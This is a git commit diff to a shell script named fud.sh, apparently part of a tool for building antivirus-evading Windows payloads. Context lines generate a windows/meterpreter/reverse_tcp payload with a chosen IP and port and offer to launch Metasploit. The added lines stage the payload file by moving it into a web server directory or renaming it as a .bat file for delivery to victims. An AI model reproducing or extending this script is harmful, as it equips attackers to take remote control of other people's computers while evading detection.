37bb8699e6b0ffc393a32ba60da089957ae7ddaa
fireorb <31089448+fireorb@users.noreply.github.com>
2017-12-31 00:42:14 -0800

    Update fud.sh

--- fud.sh
+++ fud.sh
@@ -15,6 +15,19 @@ payload=windows/meterpreter/reverse_tcp
 python pw_exec.py $payload $ip $port > /dev/null 2>&1
 rm unicorn.rc
 
+echo "You want move fireworm.txt to /var/www/html/ ( y or n) :"
+read start1;
+
+if [ $start1 = "y" ]; then
+ mv fireworm.txt /var/www/html/
+else
+ echo "Enter the file name :"
+ read filename;
+ mv fireworm.txt $filename.bat
+ echo "now your file is $filename.bat"
+
+fi
+
 echo "Do you want start metasploit ( y or n) :"
 read start;
 
